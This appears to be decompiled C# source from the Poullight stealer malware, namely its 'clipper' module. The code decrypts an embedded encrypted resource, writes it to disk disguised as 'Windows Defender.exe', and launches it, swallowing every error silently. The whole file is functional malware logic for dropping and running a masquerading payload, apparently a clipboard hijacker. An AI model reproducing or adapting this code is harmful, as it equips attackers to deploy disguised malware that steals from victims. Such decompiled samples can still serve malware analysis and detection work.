using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using Poullight.Properties;

// Token: 0x02000009 RID: 9
internal class clipper
{
	// Token: 0x06000014 RID: 20 RVA: 0x0000342C File Offset: 0x0000162C
	public static void Start()
	{
		try
		{
			string text = Exporter.Export("<cpdata>", "</cpdata>", Starter.FileData);
			if (!string.IsNullOrEmpty(text.Trim()) && text != "null")
			{
				string text2 = string.Format("{0}Windows Defender.exe", global::Buffer.path_t);
				try
				{
					if (File.Exists(text2))
					{
						File.Delete(text2);
					}
				}
				catch
				{
				}
				File.WriteAllText(text2, string.Format("{0}<clbase>{1}</clbase>", Encoding.GetEncoding(1251).GetString(Encrypter.AES_Decryptor(Resources.cpp)), text), Encoding.GetEncoding(1251));
				Process.Start(text2);
			}
		}
		catch
		{
		}
	}
}
